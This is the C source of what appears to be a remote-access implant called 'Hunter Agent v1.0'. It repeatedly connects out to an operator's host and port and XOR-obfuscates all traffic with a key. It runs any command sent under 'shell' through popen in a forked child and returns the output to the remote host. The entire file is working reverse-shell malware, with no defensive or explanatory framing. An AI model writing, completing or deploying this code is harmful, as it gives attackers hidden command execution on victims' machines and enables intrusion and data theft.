#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>
#include "helpers.c"
#include "payload_common.h"

#define MAXBUF 65536

int main(void)
{
	int connection_established;
	char* ip = LHOST;
	char* key = KEY;
	int keylen = strlen(key);
	int port = PORT;
	int n = 0;
	char buf[MAXBUF];

	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(ip);

	int sock = socket(AF_INET, SOCK_STREAM, 0);
	do {
		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
	} while(connection_established != 0);

	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
	write(sock, xorhello, 18);

	while (connection_established == 0)
	{
		while((n = read(sock, buf, MAXBUF)) > 0)
		{
			char* xorbuf = XOR(buf, key, n, keylen);
			// TODO: Revamp argument parsing (there's a better way! :)
			if(strncmp(xorbuf, "help\n", 5) == 0)
			{
				char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
				write(sock, xorhelp, strlen(MSG_HELP));
			}
			
			else if(str_starts_with(xorbuf, "shell") == 1)
			{

				int status = 0;
				pid_t wpid, child_pid;
				FILE* fp;
				
				
				char* cmd = split(xorbuf, " ");			
	
				if((child_pid = fork()) == 0)
				{
					char shell_msg[50];
					snprintf(shell_msg, 50, "\nExecuting command on PID %i\n", getpid());
					char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
					write(sock, xorshellmsg, strlen(shell_msg));

					// Create a child process and run command inside of it
					fp = popen(cmd, "r");
					if(fp == NULL) {
					    char* error = "Failed to run command\n";
					    char* xorerror = XOR(error, key, strlen(error), keylen);
					    write(sock, xorerror, strlen(error));
					    
					}
					char path[2050];
					while (fgets(path, sizeof(path), fp) != NULL) {
					    					     
					    char* xordata = XOR(path, key, strlen(path), keylen);
					    write(sock, xordata, strlen(path));
					}
					
					exit(EXIT_SUCCESS);
				}
				// Make the parent process wait for child process to terminate
				while ((wpid = wait(&status)) > 0);

			}
			else if(strncmp(buf, "exit\n", 5) == 0)
			{
				char* xorexit = XOR(MSG_EXIT_CMD, key, strlen(MSG_EXIT_CMD), keylen);
				write(sock, xorexit, strlen(MSG_EXIT_CMD));
				exit(EXIT_SUCCESS);
			}

			else
			{
				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
				write(sock, xorinvalid, strlen(MSG_INVALID));
			}		
		}
	}

	return 0;
}
